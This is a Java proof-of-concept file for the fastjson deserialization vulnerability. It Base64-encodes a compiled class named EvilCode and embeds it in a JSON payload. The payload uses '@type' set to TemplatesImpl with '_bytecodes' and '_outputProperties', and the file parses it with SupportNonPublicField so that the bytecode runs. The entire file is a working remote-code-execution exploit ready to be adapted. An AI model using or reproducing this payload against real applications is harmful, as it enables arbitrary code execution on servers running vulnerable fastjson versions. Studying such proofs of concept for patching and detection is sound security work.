package com.autoai.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;

import java.io.*;

/**
 * @Author:
 * @Date:
 * @Description:
 */
public class Pocf {
    
    public static String readClass(String cls) {
        byte[] bytes = null;
        try {
            // bytes = IOUtils.readFully(new File(cls));
            bytes = FileUtils.toByteArray(cls);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bytes);
    }
    
    public static void testAutoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        //根据自己的实际路径修改
        final String evilClassPath = System.getProperty("user.dir") + "//target//classes//com//autoai//test//EvilCode.class";
        String evilCode = readClass(evilClassPath);
        
        final String nastyClass = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + nastyClass +
                "\",\"_bytecodes\":[\"" + evilCode + "\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);

//        Object obj = JSON.parseObject(text1, Object.class);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());
    }
    
    public static void main(String args[]) {
        try {
            testAutoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
